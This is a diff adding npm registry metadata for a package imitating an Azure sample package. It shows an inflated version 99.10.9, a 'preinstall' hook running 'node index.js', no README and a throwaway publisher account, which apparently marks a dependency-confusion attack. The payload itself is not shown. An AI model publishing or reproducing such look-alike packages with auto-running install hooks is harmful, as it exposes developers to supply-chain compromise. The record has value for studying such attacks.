@@ -1,0 +1,62 @@
+{
+    "_id": "azure-ai-metrics-advisor-samples-ts",
+    "name": "azure-ai-metrics-advisor-samples-ts",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "azure-ai-metrics-advisor-samples-ts",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "azure-ai-metrics-advisor-samples-ts@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-t+L+VUESlg8MfJ3Dzjfsp4b2XZ9KgUWsWQUW1QK9rAR/e0XVdOATF+bFEfxNNGHNQbNYsVU9ABjyRlDfP8gfXw==",
+                "shasum": "49c3cf891afd311a79319e058bc422477f3074a4",
+                "tarball": "https://registry.npmjs.org/azure-ai-metrics-advisor-samples-ts/-/azure-ai-metrics-advisor-samples-ts-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5087,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiOneGACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmoYiw/6Ak8SKKg+x1GbL8PFFdO1+og96gJgy2V4Kj16gUoaCG2QNeHY\r\nPVcxi0nwIu9CP0sxujYAeXC5Oq5WqmhJIrMy8xMOfEZ2i53exEJEp6l3U5gY\r\nl6Oz5J8CZdm029h9OMwZqrhXPvbINJVeOzbblkKETm33miOEelJpmrIFMt8Q\r\nyzOHxLJLJ5sYf0REt4c5Co0eq6H8KBJ6E0/WFzahmYxQnk7JbiSrG0tXDUle\r\nuH25I3UpKxn6W3FAjCXrTqDuPbVGXBBM6LJWyM4dOgFbk5yikqxMX1ub9Hkp\r\nwpOV/UDoTGKm0v9E1x5593+WgWkJox+/96XR4NLtcO+tiYcIlYHo3PaePR/P\r\nnjnzpgjruyaicchYmAKXoYK8LoB/CgM527/kTyh685BwC8zcrr26Ndmzw2Ia\r\nOlWyD4p0yCU1ASwm1Lj4ugnk4jZe9xXeQJNqri018XhmTkAroJQo1wv0wU1z\r\nYfI4AvsE7/H1Uaix95dWkdZAn2Rffg96m8DycaCa9p+EnbRXL6WmzkRDm/BS\r\nNEFQ0JPj0A+yh8HnwYaNbD5p+A9HWS6o9I7Cz9csy38ZjnRqG9J0kjzPhu/K\r\nXeG2gbMtF8Ok6J5EjwV0Oeu+8wTDSZOyvTQxI2MXniWSzZClA7g2e3XGFm+S\r\nWe6ZFY/jDI6yrmv9Hm97vXgbJNgm8cz52i8=\r\n=Vz0v\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "nnj2zt8t",
+                "email": "nnj2zt8t@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "nnj2zt8t",
+                    "email": "nnj2zt8t@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/azure-ai-metrics-advisor-samples-ts_99.10.9_1647998854007_0.5226148192352993"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-23T01:27:34.006Z",
+        "99.10.9": "2022-03-23T01:27:34.171Z",
+        "modified": "2022-03-23T01:27:34.278Z"
+    },
+    "maintainers": [
+        {
+            "name": "nnj2zt8t",
+            "email": "nnj2zt8t@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
